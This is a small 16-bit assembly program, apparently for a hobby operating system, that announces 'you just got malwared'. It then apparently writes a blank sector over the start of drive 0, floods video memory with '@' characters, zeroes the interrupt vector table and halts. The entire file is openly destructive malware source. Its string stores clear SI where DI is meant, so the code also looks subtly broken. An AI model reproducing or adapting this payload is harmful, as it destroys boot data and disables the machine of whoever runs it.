;==============================================================================
; fasm directives
;==============================================================================

use16
org 0x0

endl equ 0xa
include "src/inc/8086.inc"

;==============================================================================
; Executable header
;==============================================================================

db "ES"
dw start
db 20 dup(0)

;==============================================================================
; Constants and variables
;==============================================================================

msg:
	db "you just got malwared", endl
msg_len = $-msg

;==============================================================================
; Main program
;==============================================================================

start:
	mov ax, cs
	mov ds, ax
	mov es, ax

main:
    mov ah, 0x3
	mov bl, 0x7
	mov cx, msg_len
	lea si, [msg]
	int 0x21

    mov ax, 0
    mov cl, 1
    mov dl, 0
    lea bx, [blank]
    int 0x23

    mov ax, 0xb800
    mov es, ax
    mov al, "@"
    mov cx, 80*25*2
    xor si, si
    cld
    rep stosb

    xor ax, ax
    mov es, ax
    mov al, 0
    mov cx, 0x400
    xor si, si
    cld
    rep stosb

    jmp $

blank: